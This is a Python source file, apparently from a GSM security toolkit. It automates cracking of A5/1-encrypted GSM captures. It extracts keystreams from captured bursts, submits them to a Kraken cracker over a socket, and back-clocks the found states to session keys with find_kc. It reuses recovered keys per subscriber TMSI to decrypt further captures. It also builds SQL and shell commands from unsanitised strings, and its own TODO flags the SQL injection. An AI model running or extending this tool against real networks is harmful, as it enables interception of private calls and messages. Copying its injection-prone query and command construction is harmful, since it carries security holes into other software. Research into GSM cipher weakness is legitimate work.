#!/usr/bin/env python

# niekt0@hysteria.sk, jenda@hrach.eu
# Under GNU GPL

# TODO:
# - fix SQLi (t = (insecure_string,); c.execute('SELECT * FROM vankuse WHERE paplon=?', t))
# - loading of per operator settings
# - overriding heuristics
# - clean code
# - natural uplink and downlink processing
# - key recycling

# status in keys.db:
#  0 - new
#  1 - in queue
#  2 - key found
#  3 - failed
#  4 - plain

import socket, string, re, os, sys, ConfigParser, time, Queue, thread, getopt;
import sqlite3 as lite;

#config = ConfigParser.ConfigParser()
#config.read(os.getenv('HOME') + '/.omgsm/config')
#gsmpath = config.get('Main', 'GSMPATH')
#gsmsession = config.get('Main', 'GSMSESSION')
#gsmkrakenhost = config.get('Main', 'GSMKRAKENHOST')
#gsmkrakenport = config.getint('Main', 'GSMKRAKENPORT')
#kraken_job_timeout = config.getint('Main', 'GSMKRAKENJOBTIMEOUT')
#dat_maxadd=config.getint('Main', 'GSMNAPALMEXMAXDATCRACK')
#kraken_burstmaxcrack=config.getint('Main', 'GSMNAPALMEXMAXBURSTCRACK')

from napalmex_config import *

# XXX
# to config file
emptykey='0000000000000000'

newpath=gsmsession+"new/"
badpath=gsmsession+"failed/"
plainpath=gsmsession+"plain/"
crackedpath=gsmsession+"cracked/"
cflags="" # convert flags
fflags="" # find_kc flags
reusing=1
failed_reusing=0

#global
dat_cracking=0
burst_cracking=0
dat_cracklist=[]
serial=0

#stat
cracked=0
reused=0
failed=0
plain=0
start=time.time()
orphans=0
dup_results=0
bursts_recv=0

# XXX move to per operator settings
#default
#mymod="mod_stupid"
mymod="230_02"


def stat():
	cur.execute("select count(1) from keys where key like '%s' and status=1"%(emptykey))
	queue_dat=cur.fetchone()[0]
	tsql.execute("select count(1) from keystreams where jobnum = -1")
	queue_bursts=tsql.fetchone()[0]
	tsql.execute("select count(1) from keystreams where submitted != -1")
	jobs=tsql.fetchone()[0]
#	print("=== %s:%s ==="%(gsmkrakenhost,gsmkrakenport))
	print("C:%s F:%s P:%s R:%s DUP:%s; q:%s dats, %s ks; %s jobs; %i FPS; %.2f k/s"%(cracked,failed,plain,reused,dup_results,queue_dat,queue_bursts,jobs,(bursts_recv/(time.time()-start)*16320),(cracked/(time.time()-start))))
#	print("queue: %s .dats, %s bursts"%(queue_dat,queue_bursts));
#	print("cracker load / cracker speed / key recovery speed: %s / %.2f FPS / %.2f keys/s"%((bursts_recv/(time.time()-start)*16320),(cracked/(time.time()-start))));

# foundkey = A5/1 secret state; bitpos = #iteration with this state
# framecount = # of burst on which we cracked the key
# frame2 = other burst we use to verify that key is correct
# bursts_pos = position of possible cracked burst in "bursts" array

def backclock(foundkey, bitpos, framecount, keystream2, framecount2, datfile, uplink):
	global cracked
	global fflags
	key=emptykey
	if(uplink == 1):
		fflags="u"
#	print     ("%s %s %s %s %s %s %s"%(gsmpath + '/kraken/Utilities/find_kc', foundkey, bitpos, framecount, framecount2, keystream2, fflags))
	f=os.popen("%s %s %s %s %s %s %s"%(gsmpath + '/kraken/Utilities/find_kc', foundkey, bitpos, framecount, framecount2, keystream2, fflags))
	res=f.read()
	m=re.search('.*: (..) (..) (..) (..) (..) (..) (..) (..)  ... MATCHED', res)
	f.close()
	if (m):
		key=(m.group(1)+m.group(2)+m.group(3)+m.group(4)+m.group(5)+m.group(6)+m.group(7)+m.group(8)).upper()
		cracked+=1
		key_found(key,datfile)

def insert_burst(filename, keystream, framecount, keystream2, framecount2, priority,uplink):
	global serial
	tsql.execute("INSERT INTO keystreams VALUES('%s','%s','%s','%s','%s','%s','%s','%s', -1, -1)"%(filename,keystream,framecount,keystream2,framecount2,priority,serial,uplink))
	serial+=1

def add_datfile(datfile, tmsi, mcnc, cellid):
	global plain
	# hotfix, sometimes napalmex is trying to move empty file
	if (not datfile):
		return
	if not decrypt(datfile, tmsi):
#		f=os.popen(gsmpath+"/bin/gsm_convert -s %s/stat/stats.db -f %s/%s %s"%(gsmpath,newpath,datfile,cflags))
		print(gsmpath+"/bin/gsm_convert -s %s/stat/operators/23002.db -f %s/%s %s  | sort -rn | tr \"+\" \"\n\" | cut -d \" \" -f 2- | grep SDCCH/DL"%(gsmpath,newpath,datfile,cflags))
		if os.path.isfile("%s/stat/operators/%s.db"%(gsmpath,mcnc)):
			f=os.popen(gsmpath+"/bin/gsm_convert -s %s/stat/operators/%s.db -f %s/%s %s  | sort -rn | tr \"+\" \"\n\" | cut -d \" \" -f 2- | grep S.CCH/.L"%(gsmpath,mcnc,newpath,datfile,cflags))
		else:
			f=os.popen(gsmpath+"/bin/gsm_convert -s %s/stat/operators/default.db -f %s/%s %s  | sort -rn | tr \"+\" \"\n\" | cut -d \" \" -f 2- | grep S.CCH/.L"%(gsmpath,newpath,datfile,cflags))


		# XXX todo: use cellid
		# XXX todo: what to do if operator is not found / if we do not want to crack sdcch downlink for example, ...

		bursts_pos=0 # burst position in frame
		prev_keystream="" # for verifying the very last burst in each frame
		prev_frameno=""
		for line in f.readlines():
			m=re.search('^S.CCH/(.).* .* (.*): (.*)', line) # 1 - framenumber, 2 - guessed_keystream
			if(m):
				#print line;
				ul_group=0
				if(m.group(1) == "U"):
					ul_group=1
					#print "uplink"
							# if this is the first burst of the frame
							# there is no keystream to check againt yet
				if(bursts_pos%4 == 1):	# if this is the second burst of the frame
							# we need to add the first burst too
					insert_burst(datfile, prev_keystream, prev_frameno, m.group(3), m.group(2), 0, ul_group)
				if(bursts_pos%4 > 0):   # and then just add the current burst
					insert_burst(datfile, m.group(3), m.group(2), prev_keystream, prev_frameno, 0, ul_group)
				prev_keystream=m.group(3)
				prev_frameno=m.group(2)
				bursts_pos+=1
		f.close()
		if bursts_pos == 0: 
			# no keystream returned, assume decoding of the whole 
			# capture succeeded (no encryption used)
			print("PLAIN %s"%datfile)
			os.system("mv %s/%s %s"%(newpath,datfile,plainpath))
			cur.execute("update keys set status=4 where file like '%s'"%datfile)
			plain+=1
		else:
			cur.execute("update keys set status=1 where file like '%s'"%datfile)
	con.commit()
	sqlko_internal.commit()

def submit_burst(row):
	sock.send("crack %s\n"%row[1])
	tsql.execute("update keystreams set submitted=%d where keystream like '%s';"%(int(time.time()),row[1]))
#	print "crack %s"%row[1]
# used for generating plots

def job_finished(m):
	global failed
	tsql.execute("select * from keystreams where jobnum = '%s'"%m.group(1))
	row=tsql.fetchone()
	if row == None:
		print("Strange, cracker returned job I did not submit!")
		return
	datfile=row[0]
	tsql.execute("select count(1) from keystreams where filename = '%s'"%datfile)
	if tsql.fetchone()[0] == 1:
		cur.execute("update keys set status=3 where file like '%s' and key like '%s'"%(datfile,emptykey))
		if os.path.exists("%s/%s"%(newpath,datfile)):
			failed+=1
			print("FAILED %s"%datfile)
			os.system("mv %s/%s %s"%(newpath,datfile,badpath))
		con.commit()
	tsql.execute("delete from keystreams where jobnum = %s"%m.group(1))
	sqlko_internal.commit()

def state_found(m):
	# 1 - secret state; 2 - bitpos; 3 - jobnum
	tsql.execute("select * from keystreams where jobnum = %d"%int(m.group(3)))
	row = tsql.fetchone()
	if row == None:
		print("Strange, cracker solved job I did not submit!")
		return
	backclock(m.group(1), m.group(2), row[2], row[3], row[4], row[0], row[7])

def key_found(key, datfile):
	global dup_results
	global cracked
	cur.execute("update keys set key='%s', status=2 where file like '%s';"%(key,datfile))
	con.commit()
	if os.path.exists("%s/%s"%(newpath,datfile)):
		cur.execute("select timestamp from keys where file like '%s';"%(datfile))
		row = cur.fetchone()
		try:
#			if row[0].isnumeric(): # sometimes something else (?) is returned
			delay = time.time() - int(row[0])
		except ValueError:
			delay=0
			print("BUG")
		print("CRACKED %s, delay = %i"%(datfile, 0))
		os.system("mv %s/%s %s/"%(newpath,datfile,crackedpath))
#		os.system("./run %s %s %i"%(datfile,key,delay))
		tsql.execute("delete from keystreams where filename='%s' and submitted = -1"%(datfile))
	else:
		print("DUP %s"%datfile)
		dup_results+=1
		cracked-=1

def decrypt(datfile, tmsi):
	global reused
	cur = con.cursor()
	# XXX optimization per BTS, per time (e.g. week lasting session)
	cur.execute("select distinct(key) from keys where key not like '%s' and tmsi like '%s'"%(emptykey, tmsi))
	while True:
		row = cur.fetchone()
		if row == None:
			break
		found=os.system(gsmpath+"/bin/gsm_convert -f %s -k %s 2>/dev/null |grep -q KEY_OK"%(datfile,row[0]))
		if found == 0:
			reused+=1
			key_found(row[0], datfile)
			return True
	return False

def usage():
	print sys.argv[0]+" [options]"
	print "If run without filename, starts automated cracking of current session"
	print "Options:"
	print " -h, --help : This help"
	print " -u, --uplink : Try to crack uplink"
	print " -p text, --plaintext text : Use provided plaintext"
	print " -s filename, --single filename: Try to crack just single bursts file"
	print " -r 1/0, --reusing 1/0 : Try to reuse previously cracked keys (default on)"
	print " -f 1/0, --failed-reusing 1/0: Try to use new keys on previously failed bursts (default off)"


	return

try:
	opts, args = getopt.getopt(sys.argv[1:], "hc:us:r:f:", ["help", "cflags=","uplink","single=","reusing=","failed-reusing="])

except getopt.GetoptError:
	usage()
	sys.exit(2)
for opt, arg in opts:
	if opt in ("-h", "--help"):
		usage()                     
		sys.exit()                  
	elif opt in ("-u", "--uplink"):
		fflags="u" 
		cflags+=" -u"
	elif opt in ("-c", "--cflags"):
		cflags+=arg
	elif opt in ("-m", "--module"):
		mymod=arg
	elif opt in ("-s", "--single"):
		# crack just single file
		key=prepare_for_kraken(arg)
		print arg+"\t"+key
		sys.exit(0)
	elif opt in ("-r", "--reusing"):
		if arg == '0':
			reusing=0
		if arg == '1':
			reusing=1
	elif opt in ("-f", "--failed-reusing"):
		if arg == '0':
			failed_reusing=0
		if arg == '1':
			failed_reusing=1
	else:
		assert False, "unhandled option"

# automated mode
# 1reate keys.db if database does not exists
con = None
try:
	con=lite.connect(gsmsession+'keys.db');
#	con=lite.connect(gsmsession+'keys.db', isolation_level=None)

	cur = con.cursor()    
	cur.execute('SELECT count(1) from keys') 
	data = cur.fetchone()
    
except lite.Error, e:
	cur.execute("CREATE TABLE keys(timestamp INT, file TEXT, tmsi text, key text, status INT, cid INT, mncc INT)")
	cur.execute("CREATE INDEX idx_file on keys(file);");
	cur.execute("CREATE INDEX idx_key on keys(key);");
	cur.execute("CREATE INDEX idx_status on keys(status);");
	cur.execute("CREATE INDEX idx_tmsi on keys(tmsi);"); # XXX test performance

	con.commit()

cur.execute("update keys set status=0 where status=1 and key like '%s'"%emptykey) # recovery after crash
con.commit()

# internal database 
sqlko_internal=lite.connect(":memory:");
#sqlko_internal=lite.connect(":memory:",isolation_level=None)
tsql = sqlko_internal.cursor()
tsql.execute("CREATE TABLE keystreams(filename TEXT,keystream TEXT,framecount INT,keystream2 TEXT,framecount2 INT,priority INT,serial INT,uplink INT,jobnum INT,submitted INT)")

tsql.execute("CREATE INDEX idx_filename on keystreams(filename);");
tsql.execute("CREATE INDEX idx_keystreams on keystreams(keystream);");
tsql.execute("CREATE INDEX idx_jobnum on keystreams(jobnum);");
tsql.execute("CREATE INDEX idx_submitted on keystreams(submitted);");

sqlko_internal.commit()
#sqlko_internal.close()
# open connection to the Kraken
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.settimeout(gsmkrakentimeout)
sock.connect((gsmkrakenhost, gsmkrakenport))

#hack, not optimal (blocking & not timeouting)
sock.setblocking(0)
sfile=sock.makefile("rb")

#main loop
laststat=time.time()
while (1):
	# Part 1: get new files
#       tsql.execute("select count(distinct filename) from keystreams")
#       dat_add = dat_maxadd # tsql.fetchone()[0]
#       if (dat_add > 0):
#               cur.execute("select file,tmsi from keys where key like '%s' and status=0 order by timestamp desc limit %i"%(emptykey,dat_add))
#               result=cur.fetchall()
#               i=0
#               while True:
#                       if i>=len(result):
#                               break
#                       row = result[i]
#                       add_datfile(row[0],row[1])
#                       i+=1
	print "test1";
	cur.execute("select file,tmsi,mcnc,cellid from keys where key like '%s' and status=0 order by timestamp desc limit %i"%(emptykey, dat_maxadd))
	result=cur.fetchall()
	for i in range(len(result)):
		row = result[i]
		tsql.execute("select count(1) from keystreams");
		bursts_to_add=burst_maxqueue-tsql.fetchone()[0];
		if bursts_to_add > 0:
			add_datfile(row[0],row[1],row[2],row[3])
		else:
			break

	print "test2";
	# Part 2: send parsed bursts for cracking
	tsql.execute("select count(1) from keystreams where submitted != -1")
	to_crack=kraken_burstmaxcrack-tsql.fetchone()[0]
	tsql.execute("select filename,keystream,MIN(serial) from keystreams k where submitted = -1 group by filename order by priority desc, (select count(1) from keystreams where k.filename = filename and submitted <> -1), serial desc limit %i"%to_crack)
#	tsql.execute("select * from keystreams where submitted = -1 group by filename order by priority desc, serial desc")
	result=tsql.fetchall()
	for i in range(to_crack):
		if i>=len(result):
			break
		row = result[i]
		submit_burst(row)
	
	sqlko_internal.commit()

	print "test3";
	# Part 3: remove stuck bursts
#	tstamp=int(time.time()-kraken_job_timeout)
#	tsql.execute("select count(*) from keystreams where submitted < %s and submitted > 0"%tstamp)
#	row = tsql.fetchone()
#	if row[0] > 0:
#		orphans+=int(row[0])
#		print("Removing %s orphans"%row[0])
#		tsql.execute("delete from keystreams where submitted < %s and submitted > 0"%tstamp)

	# Part 4: read returned data from cracker & process them
	while True:
		try:
			line=sfile.readline().strip()
		except:
			line=""
#			time.sleep(napalmexdelay)
			break
		m=re.search('crack #(.*) took',line)
		if(m):
			job_finished(m)
			bursts_recv+=1
		m=re.search('Found (.*) @ (.*) #(.*)  ',line)
		if(m):
			state_found(m)
		m=re.search('Cracking #(.*) (.*)',line)
		if(m):
			tsql.execute("update keystreams set jobnum=%d where keystream like '%s';"%(int(m.group(1)),m.group(2)))
			sqlko_internal.commit()

	if laststat+napalmexdelay<time.time():
		stat()
		laststat=time.time()
	else: # don't do cycles more often than delay
		time.sleep(laststat+napalmexdelay-time.time())

